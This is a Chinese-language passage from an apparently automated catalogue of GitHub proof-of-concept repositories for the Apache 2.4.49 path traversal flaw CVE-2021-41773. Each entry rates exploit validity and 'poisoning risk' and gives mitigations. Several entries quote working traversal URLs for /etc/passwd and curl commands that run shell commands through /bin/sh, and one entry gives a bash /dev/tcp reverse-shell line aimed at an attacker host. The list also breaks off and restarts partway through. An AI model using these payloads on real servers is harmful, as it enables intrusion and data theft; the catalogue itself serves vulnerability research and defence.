1.  **路径遍历：** 利用Apache HTTP Server 2.4.49在路径规范化方面的缺陷，通过构造包含`.%2e`的URL，绕过Alias-like指令的限制，访问服务器上的任意文件。如果目标文件没有被"require all denied"等配置保护，则可以成功读取文件内容，例如`/etc/passwd`。
2.  **远程代码执行：** 如果服务器配置允许CGI脚本执行，攻击者可以通过构造特殊的HTTP POST请求，将恶意代码作为CGI脚本的输入，从而在服务器上执行任意命令。例如，可以使用`bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1`命令建立反向shell，从而完全控制目标服务器。

**防范措施：**

*   升级到Apache HTTP Server 2.4.50或更高版本。
*   配置"require all denied"，限制对敏感文件的访问。
*   禁用不必要的CGI脚本执行。
*   监控服务器日志，及时发现异常请求。

**项目地址:** [khaidtraivch/CVE-2021-41773-Apache-2.4.49-](https://github.com/khaidtraivch/CVE-2021-41773-Apache-2.4.49-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #32

**来源**: [CVE-2021-41773-luongchivi_CVE-2021-41773.md](../2021/CVE-2021-41773-luongchivi_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露和远程代码执行 (Remote Code Execution, RCE)

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且Alias指令配置不当，未对外部文件目录进行访问限制。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的路径遍历漏洞。攻击者可以通过构造包含`/.%2e`或`/%2e%2e`等特殊序列的URL，绕过服务器的路径规范化检查，从而访问Alias指令配置之外的文件。

**有效性：**
提供的Dockerfile和docker-compose.yml文件用于搭建存在CVE-2021-41773漏洞的Apache HTTP Server 2.4.49环境。README.md中提供了利用该漏洞读取`/etc/passwd`文件的POC，验证了漏洞的有效性。搜索引擎结果也表明该漏洞可以被利用来进行路径遍历和远程代码执行。

**投毒风险：**
Dockerfile仅仅是从官方镜像拉取存在漏洞的镜像并复制httpd.conf，httpd.conf是基本的apache配置，没有恶意代码。docker-compose文件只是启动docker。
文件分析结果如下：
*   **Dockerfile:**  该文件用于构建包含漏洞版本的Apache镜像，没有发现恶意行为。
*   **README.md:**  该文件提供了漏洞的POC，用于验证漏洞，其中包含的命令用于读取`/etc/passwd`等文件，属于漏洞利用行为，而非投毒。
*   **docker-compose.yml:**  该文件用于配置和启动Docker容器，没有发现恶意行为。
*   **httpd.conf:**  配置文件为apache的默认配置, 没有恶意行为
虽然没发现明显的恶意代码，但如果使用者不了解漏洞原理，直接部署该环境，可能会造成安全风险。因此，存在极低的投毒风险，约5%。

**利用方式：**
1.  攻击者构造恶意的URL，其中包含`/.%2e`或`/%2e%2e`等序列，用于绕过路径规范化检查。
2.  URL指向`/cgi-bin/`目录下的文件，并利用路径遍历访问目标文件，例如`/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
3.  如果服务器配置允许执行CGI脚本，攻击者甚至可以利用该漏洞执行任意代码，例如通过POST请求传递恶意代码到目标文件。

**修复建议：**
1.  升级到Apache HTTP Server 2.4.50或更高版本。
2.  在Apache配置文件中，对根目录`/`设置`Require all denied`，防止未授权访问。

**项目地址:** [luongchivi/CVE-2021-41773](https://github.com/luongchivi/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #33

**来源**: [CVE-2021-41773-mah4nzfr_CVE-2021-41773.md](../2021/CVE-2021-41773-mah4nzfr_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且启用了 cgi-bin 目录，Alias配置不当，存在文件系统权限问题。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于路径规范化处理的缺陷导致的路径遍历漏洞，攻击者可以利用该漏洞访问服务器上受限目录之外的文件。如果服务器的 Alias 配置不当，并且文件系统权限设置不合理，攻击者甚至可以通过上传恶意 CGI 脚本来实现远程代码执行。

**有效性：**
提供的 POC 代码看起来是有效的。它利用了路径遍历漏洞，尝试访问 `/bin/sh` 可执行文件，并通过 POST 请求传递包含反向 shell 命令的 DATA。`--path-as-is` 选项确保 curl 不会对 URL 进行规范化，从而允许路径遍历。

**投毒风险：**
漏洞利用代码本身看起来比较直接，目的是触发一个反向shell。`LICENSE`文件正常。
检查以下内容：
1.  **代码混淆：** 代码没有被混淆。
2.  **隐藏命令：** 没有发现隐藏或混淆的命令。
3.  **依赖项：**  该脚本不依赖于任何外部文件或库。
4.  **作者信誉：**  作者的github需要进一步评估，但目前从代码本身看不出明显的恶意。
综合评估，存在投毒代码的可能性较低，估计为 10%。风险主要在于如果攻击成功，攻击者能够在目标系统上执行任意命令，这本身就构成了极大的安全风险。

**利用方式：**
1.  **路径遍历：**  利用 `/.%2e/%2e%2e/` 序列绕过 Apache 的路径访问限制。
2.  **CGI 执行：**  如果 `cgi-bin` 目录已启用，攻击者可以将请求指向该目录。
3.  **反向 Shell：**  通过 POST 请求，攻击者传递一个包含反向 shell 命令的字符串，该命令会在服务器上执行，从而使攻击者获得对服务器的远程访问权限。
4. **payload构造:** 首先构造畸形的URL, 包含`/.%2e/%2e%2e/` 序列, 并指定到系统程序`/bin/sh`, 通过`POST`方法,将需要执行的代码注入到`DATA`变量中.

**总结：**
CVE-2021-41773 是一个严重的安全漏洞，可以被利用进行路径遍历和远程代码执行。提供的 POC 代码可以有效利用此漏洞，但是务必在授权的情况下进行测试。代码本身投毒风险较低，但成功利用漏洞后的风险极高。

**项目地址:** [mah4nzfr/CVE-2021-41773](https://github.com/mah4nzfr/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #34

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773-PoC.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773-PoC.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致文件泄露，甚至远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且Alias配置的目录未启用 "require all denied" 保护，CGI脚本需要启用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符的URL，绕过Alias指令的限制，访问服务器上未授权的文件。如果目标服务器同时启用了CGI脚本支持，则攻击者可能进一步利用此漏洞执行任意代码。

**有效性：**

根据漏洞库信息、搜索结果和漏洞利用代码，可以判断该漏洞的POC代码是有效的。漏洞库中明确指出此漏洞已被在野利用。搜索引擎结果也显示了POC的存在和利用方式。

**投毒风险：**

提供的Dockerfile中，核心操作是：

1.  `FROM httpd:2.4.49`:  指定基础镜像为httpd:2.4.49，这是一个官方镜像，降低了投毒的可能性。
2.  `RUN sed -i 's/Require all denied/# Require all denied/g' /usr/local/apache2/conf/httpd.conf`:  这行代码将httpd.conf文件中的`Require all denied`注释掉。这正是为了使漏洞更容易被利用。如果没有这一行，即使存在路径遍历，也无法读取到未授权的文件（因为默认是拒绝所有访问）。这部分不是投毒，而是为了方便漏洞验证。
其他文件是`LICENSE`，仅包含Apache License 2.0的文本，不涉及任何恶意代码。

因此，直接的恶意投毒代码的可能性较低，但该Dockerfile的意图是创造一个存在漏洞的环境，以便更容易地利用漏洞。该仓库本身并没有主动植入恶意代码，而是提供了一个方便利用漏洞的环境。考虑到该行为可能被恶意利用，判定存在10%的投毒风险，因为此Dockerfile的目的是为了移除安全防护，为攻击者降低利用门槛。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含`..%2f`的URL，尝试访问受限目录之外的文件。`%2f`是`/`的URL编码，`..`表示上一级目录。多次使用`..%2f`可以突破目录限制。
2.  **文件读取：** 如果成功绕过限制，攻击者可以读取服务器上的任意文件，例如配置文件、源代码等。
3.  **远程代码执行 (RCE)：** 如果目标服务器启用了CGI，攻击者可以通过上传恶意CGI脚本并执行，实现远程代码执行。利用路径遍历，将请求发送到位于服务器文件系统上的CGI脚本，从而执行任意命令。

例如，攻击者可以使用如下URL读取`/etc/passwd`文件：

`http://target/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd`

如果启用了CGI，攻击者可以尝试利用路径遍历访问并执行CGI脚本，例如：

`http://target/cgi-bin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fpath/to/malicious.cgi`

**项目地址:** [mightysai1997/CVE-2021-41773-PoC](https://github.com/mightysai1997/CVE-2021-41773-PoC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #35

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773-i-.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773-i-.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露或远程代码执行 (取决于配置)

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行 Apache HTTP Server 2.4.49，且 Alias 指令配置不当或 CGI 脚本启用。需要可以发送 HTTP 请求的网络访问。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的一个路径遍历漏洞。该漏洞源于 Apache HTTP Server 在路径规范化方面存在缺陷，攻击者可以利用该漏洞将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到 "require all denied" 等默认配置的保护，请求就可以成功。如果为这些 Aliased 路径启用了 CGI 脚本，则可能导致远程代码执行。

**漏洞利用方式：**

攻击者通过构造包含特殊编码（如 `%2e`）的路径的 HTTP 请求，绕过 Apache HTTP Server 的路径检查，从而访问受限目录之外的文件。例如，`GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1` 这样的请求可以尝试读取服务器上的 `/etc/passwd` 文件。

根据提供的 Dockerfile 和 README.md，PoC 的有效性依赖于两个关键步骤：

1.  **Dockerfile:** 使用 `httpd:2.4.49` 镜像，确保存在漏洞的 Apache 版本。
2.  **httpd.conf:**  修改 `httpd.conf` 文件，将 `<Directory />` 部分的 `Require all denied` 更改为 `Require all granted`。这一步**至关重要**，因为 `Require all denied` 配置会阻止对根目录的访问，从而阻止漏洞利用。如果未修改此配置，即使存在漏洞，也无法读取文件。

**投毒风险分析：**

分析提供的 Dockerfile 和 httpd.conf 文件，发现投毒代码的风险较低，估计为 5%。主要风险在于以下可能性：

*   **`httpd.conf` 修改的误导性:**  虽然 README.md 中明确说明了修改 `Require all denied` 的原因，但如果用户盲目复制粘贴配置文件，可能会在无意中降低服务器的安全性。
*   **CGI脚本的滥用:** 虽然PoC本身不包含恶意CGI脚本，但如果服务器上存在未授权或存在漏洞的CGI脚本，攻击者可能会利用该漏洞执行恶意代码。

总体来说，该 PoC 主要用于演示漏洞，但使用者应该意识到其潜在的安全风险。

**项目地址:** [mightysai1997/CVE-2021-41773-i-](https://github.com/mightysai1997/CVE-2021-41773-i-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #36

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773S.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773S.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 & 远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未授权的攻击者访问敏感信息，甚至执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且配置允许CGI脚本执行或者存在Alias-like指令的配置。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的 URL，绕过 Alias-like 指令的限制，访问服务器上受限目录之外的文件。如果服务器同时启用了 CGI 脚本执行，攻击者还可以通过该漏洞执行任意代码。

**有效性：**

提供的 PoC 代码是有效的。通过发送包含 URL 编码的路径遍历字符的 HTTP 请求，可以读取`/etc/passwd`等敏感文件，或者如果启用了 CGI，则可以执行系统命令。

例如，使用 `curl http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd` 可以尝试读取`/etc/passwd`文件。
如果服务器配置允许 CGI 执行，使用 `curl 'localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;id'` 可以在服务器上执行 `id` 命令。

**投毒风险：**

查看提供的 Dockerfile 和 httpd.conf 文件，未发现明显的恶意代码。`blueteamsteve` 提供的 Docker 镜像配置目的是为了复现漏洞，使得利用更加方便。虽然代码本身没有恶意，但如果攻击者修改 Dockerfile 或者 httpd.conf 文件，加入恶意代码并重新构建镜像，可能会存在投毒风险。从现有信息判断，代码本身投毒风险极低，给出1%的概率。 

**利用方式：**

1.  **路径遍历：** 攻击者通过构造包含`/.%2e/.%2e/`的特殊 URL，尝试访问服务器上的任意文件。`%2e` 是`.`的 URL 编码，用于绕过某些安全限制。
2.  **远程代码执行（RCE）：** 如果服务器启用了 CGI 脚本，攻击者可以通过路径遍历访问到 `/bin/sh` 等 shell 程序，并执行任意命令。

为了成功利用该漏洞，目标服务器需要满足以下条件：

*   运行 Apache HTTP Server 2.4.49 版本。
*   服务器的配置存在 Alias-like 指令，且对受限目录之外的文件没有进行严格的访问控制。
*   可选：服务器启用了 CGI 脚本执行。

**项目地址:** [mightysai1997/CVE-2021-41773S](https://github.com/mightysai1997/CVE-2021-41773S)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #37

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773h.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773h.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 版本，并且 Alias 指令配置不当，允许访问受限目录之外的文件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符的 URL，绕过 Alias 指令的限制，访问服务器上未授权的文件。如果服务器配置允许 CGI 脚本在这些 aliased 路径下执行，则攻击者可能进一步实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，CVE-2021-41773 在野外已被利用。提供的 Dockerfile 使用了 `httpd:2.4.49-alpine` 镜像，明确指定了受影响的 Apache 版本。Dockerfile 下载并替换了默认的 `httpd.conf` 配置文件。如果这个 `httpd.conf` 配置不安全，例如没有正确的 `Require all denied` 规则，那么漏洞利用将是有效的。综上所述，该POC的有效性较高，但依赖于 `httpd.conf` 的具体内容。

**投毒风险分析：**

提供的文件列表中，`LICENSE` 文件是标准的 Apache 许可证，没有投毒风险。Dockerfile本身只包含下载配置文件和替换配置文件的操作。投毒风险主要在于从 `https://raw.githubusercontent.com/itsecurityco/CVE-2021-41773/main/httpd.conf` 下载的 `httpd.conf` 文件。攻击者可能会修改该文件，例如：

*   **放宽访问限制：**  允许访问敏感目录，例如 `/var/www/html` 之外的目录。
*   **配置恶意 CGI 脚本：**  允许执行任意代码。
*   **植入后门：**  在配置文件中添加恶意指令，例如通过 mod_rewrite 实现后门访问。

由于无法直接分析远程 `httpd.conf` 文件的内容，因此存在一定的投毒风险。 这里估计投毒风险为 10%，因为该项目看起来是为了演示漏洞，不太可能包含恶意代码，但仍然需要谨慎。

**利用方式分析：**

利用方式主要通过构造恶意的 HTTP GET 请求，其中包含经过 URL 编码的路径遍历字符。例如，可以使用 `%2e%2e/` 或 `%252e%252e/` 来绕过路径规范化，访问目标目录之外的文件。

例如，如果目标服务器存在以下 Alias 配置：

```
Alias /images /var/www/images
```

攻击者可以使用以下 URL 访问 `/etc/passwd` 文件：

```
GET /images/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
```

如果 CGI 脚本已启用，则可以构造包含恶意代码的 CGI 脚本，并通过路径遍历漏洞执行它，从而实现远程代码执行。

**项目地址:** [mightysai1997/CVE-2021-41773h](https://github.com/mightysai1997/CVE-2021-41773h)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #38

**来源**: [CVE-2021-41773-psibot_apache-vulnerable.md](../2021/CVE-2021-41773-psibot_apache-vulnerable.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal, Remote Code Execution (RCE)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49 或 2.4.50，且配置允许CGI脚本执行，部分Alias目录未进行 require all denied 限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中，是一个路径遍历漏洞。攻击者可以通过构造包含恶意路径的URL，绕过 Alias 指令配置的目录限制，访问服务器上的任意文件，如果目标开启了CGI支持，攻击者可以通过构造恶意请求执行任意代码。该漏洞利用的关键在于路径规范化处理的缺陷，允许攻击者使用 `/.%2e` 绕过限制。

**有效性：**
根据漏洞描述和提供的漏洞利用代码，可以判定该POC代码是有效的。漏洞库信息、搜索引擎结果和漏洞利用代码都确认了该漏洞的存在以及利用方式。Nuclei模板可以用来检测目标服务器是否存在漏洞，而curl命令的POC则直接利用了路径遍历读取 `/etc/passwd` 文件。

**投毒风险：**
提供的代码仓库主要包含Nuclei的YAML模板文件和一个README.md文件。Nuclei模板主要用于漏洞检测，本身不具备直接植入后门的能力。投毒风险主要集中在以下几个方面：
1.  **模板逻辑修改：** 攻击者可能修改模板的匹配规则，使得原本不存在漏洞的服务器也被误判为存在漏洞，从而误导用户进行后续操作。
2.  **模板Payload替换：**  攻击者可能在模板中替换恶意的payload，例如，将读取`/etc/passwd` 替换为执行恶意命令的payload。但提供的模板中直接包含RCE利用，风险相对较小
3.  **依赖库劫持：** 虽然Nuclei本身是安全的，但如果用户使用的Nuclei版本存在依赖库劫持的风险，攻击者可能通过替换Nuclei的依赖库来执行恶意代码。但此风险与本仓库代码关系不大。

因此，综合考虑，该仓库存在一定的投毒风险，但主要集中在Nuclei模板的修改上，而不是直接包含恶意代码。 风险占比10%。

**利用方式：**
1.  **路径遍历（文件读取）：** 攻击者构造包含 `/.%2e/%2e%2e/%2e%2e/%2e%2e/` 序列的URL，尝试读取服务器上的任意文件，例如 `/etc/passwd`。
2.  **远程代码执行 (RCE)：**  如果服务器启用了CGI，攻击者可以通过路径遍历访问到CGI脚本，并通过构造特殊的请求来执行任意命令。具体方法通常依赖于服务器的具体配置和CGI脚本的编写方式。

**项目地址:** [psibot/apache-vulnerable](https://github.com/psibot/apache-vulnerable)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #39

**来源**: [CVE-2021-41773-r0otk3r_CVE-2021-41773.md](../2021/CVE-2021-41773-r0otk3r_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50 (CVE-2021-42013是对CVE-2021-41773的不完全修复)

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，可能需要CGI模块启用，以及Alias配置不当。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的URL，绕过Alias等指令的限制，访问服务器上的任意文件。如果服务器同时启用了CGI，则可能进一步导致远程代码执行。漏洞利用代码`exploit.py`提供LFI(本地文件包含)和RCE(远程代码执行)两种攻击模式。LFI模式通过构造包含`/.%2e`序列的URL，读取服务器上的文件。RCE模式利用CGI执行命令，通过POST请求发送包含命令的Payload。

**漏洞利用方式：**

1.  **路径遍历 (LFI)：** 攻击者构造包含`/.%2e/%2e%2e`序列的URL，尝试访问受限目录之外的文件，例如`/etc/passwd`。  该漏洞利用代码中的payload1和payload2就是用于此目的，通过拼接路径来尝试读取目标文件。
2.  **远程代码执行 (RCE)：** 如果目标服务器启用了CGI，攻击者可以利用路径遍历漏洞，访问CGI脚本目录，并通过POST请求执行任意命令。漏洞利用代码中的payload3就是用于指定CGI脚本的位置，然后通过构造POST请求，在data中包含要执行的命令。

**关于投毒风险：**
该漏洞利用代码 `exploit.py` 本身看起来比较直接，目的是利用该漏洞。存在投毒的可能性较低，但仍不能完全排除，比如作者可以在交互式shell部分加入一些后门代码,或者在payload中加入恶意指令。经过分析，判断存在10%的投毒风险。`README.md`文件看起来也比较标准，风险较低。

**搜索引擎结果：**
搜索引擎结果表明该漏洞确实存在，且已被广泛利用。多个文章指出该漏洞可以导致敏感信息泄露和远程代码执行。

**项目地址:** [r0otk3r/CVE-2021-41773](https://github.com/r0otk3r/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #40

**来源**: [CVE-2021-41773-redspy-sec_CVE-2021-41773.md](../2021/CVE-2021-41773-redspy-sec_CVE-2021-41773.md)

# CVE-2021-41773

> 📦 该CVE有 **43** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-41773-0xGabe_Apache-CVEs.md](../2021/CVE-2021-41773-0xGabe_Apache-CVEs.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符（如 `%2e`，即 URL 编码的点 `.`）的恶意 URL，绕过服务器配置的 Alias 指令限制，访问服务器上受限目录之外的文件。如果目标服务器同时启用了 CGI 脚本的执行，攻击者还可以通过类似的路径遍历方式，执行任意命令。

**有效性评估：**

根据漏洞描述、搜索引擎结果和提供的 POC 代码，可以判定此漏洞的 POC 代码具有较高的有效性。漏洞库信息明确指出此漏洞已被在野利用，搜索引擎结果也提供了相关的利用案例和分析。POC 代码 `cve-2021-41773.py` 提供了路径遍历读取文件以及远程命令执行两种利用方式，并对 Apache 服务器版本进行了简单的指纹识别。

**投毒风险评估：**

分析提供的 POC 代码，`LICENSE` 文件采用标准的 MIT 许可，`README.md` 文件描述了漏洞和利用方法，`cve-2021-41773.py` 文件实现了漏洞利用。代码逻辑相对简单，主要利用 `urllib` 和 `requests` 库发送 HTTP 请求，没有发现明显的恶意代码或者后门。存在极低的投毒风险，例如细微的编码错误或依赖项问题，因此评估投毒风险为 5%。

**利用方式分析：**

利用方式主要有两种：

1.  **路径遍历文件读取：** 攻击者构造包含 URL 编码的路径遍历字符的 URL，例如 `/.%2e/.%2e/.%2e/.%2e/etc/passwd`，尝试读取服务器上的敏感文件。POC 代码中的 `pathTraversal` 函数实现了该功能。

2.  **远程命令执行：**  攻击者利用路径遍历漏洞访问 CGI 脚本目录，并向该目录下的 `sh` (或其他 shell 解释器) 传递要执行的命令。POC 代码中的 `remoteCommandExecution` 函数模拟了这一过程，构造包含命令的 POST 请求，发送到目标服务器。注意，利用此方法需要目标服务器配置允许执行 CGI 脚本。

**项目地址:** [0xGabe/Apache-CVEs](https://github.com/0xGabe/Apache-CVEs)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #2

**来源**: [CVE-2021-41773-0xc4t_CVE-2021-41773.md](../2021/CVE-2021-41773-0xc4t_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的一个路径遍历漏洞。攻击者可以通过构造包含特殊字符（如 URL 编码的 '..', 即 '%2e' 或 '%32%65'）的恶意 URL，绕过 Alias-like 指令配置的目录限制，访问服务器上的任意文件。如果服务器配置允许 CGI 脚本执行，攻击者还可以利用该漏洞执行任意代码。

**利用方式：**

1.  **路径遍历（LFI）:** 攻击者可以使用包含编码后的 '..' 序列的 URL 来访问服务器上的敏感文件，例如 `/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
2.  **远程代码执行（RCE）:** 如果目标服务器的 `/cgi-bin/` 目录启用了 CGI 脚本执行，攻击者可以通过上传恶意脚本并使用路径遍历漏洞来执行它们，例如 `curl 'http://localhost:81/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; whoami'`。

**有效性：**

根据漏洞库信息和搜索结果，提供的 POC 代码是有效的。漏洞库信息中明确指出此漏洞已被在野利用，搜索结果中也提供了大量关于该漏洞的分析和利用方法，POC可以复现LFI和RCE。

**投毒风险：**

此仓库存在轻微的投毒风险（5%），因为攻击者可能会修改 Dockerfile 或 httpd.conf 文件，例如添加恶意的反弹shell脚本到CGI目录，或修改httpd.conf 允许所有目录可访问。 正常的POC验证不会有这种行为, 但是总体上，该仓库主要用于漏洞演示和利用，恶意代码的可能性较低，用户在搭建环境和使用POC时，应该注意检查 Dockerfile 和 httpd.conf 文件。

**项目地址:** [0xc4t/CVE-2021-41773](https://github.com/0xc4t/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #3

**来源**: [CVE-2021-41773-Ask-os_CVE-2021-41773.md](../2021/CVE-2021-41773-Ask-os_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** mod_cgi 必须启用，目标服务器运行 Apache HTTP Server 2.4.49 且相关目录未配置 "require all denied"

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中的一个路径遍历漏洞。该漏洞源于 Apache HTTP Server 在处理 URL 路径时存在缺陷，攻击者可以利用 `/.%2e/` 序列绕过路径规范化检查，从而访问受限目录之外的文件。如果服务器配置允许执行 CGI 脚本，攻击者可以通过构造包含恶意命令的 HTTP 请求执行任意代码，导致远程代码执行（RCE）。

**有效性：**
提供的 POC 代码 (`CVE-2021-42013.py`) 旨在利用此漏洞。它通过 `curl` 命令发送包含路径遍历序列和 shell 命令的 HTTP 请求，从而在目标服务器上执行命令。`README.md` 文件描述了漏洞细节和利用方法，包括依赖项（Python 3 和 `curl`），执行命令的示例，增强了漏洞利用的有效性。

**投毒风险：**
虽然提供的代码旨在利用漏洞，但仍存在轻微的投毒风险的可能性。例如，`README.md` 中可能存在误导信息，导致用户以非预期的方式使用该脚本，或者脚本本身可能包含某些不明显或未记录的功能，但考虑到作者主要目的是复现该漏洞，以及代码整体比较简单，所以推测投毒的可能性为10%。 

**利用方式：**
1.  **路径遍历：** 攻击者利用 URL 中的 `/.%2e/` 序列，尝试访问服务器文件系统上的任意文件。
2.  **CGI 脚本执行：** 如果目标服务器启用了 `mod_cgi` 模块，攻击者可以构造包含恶意命令的 HTTP 请求，并将其发送到 CGI 脚本处理程序。
3.  **远程代码执行：** 服务器执行 CGI 脚本时，会执行攻击者提供的命令，从而实现远程代码执行。

**项目地址:** [Ask-os/CVE-2021-41773](https://github.com/Ask-os/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #4

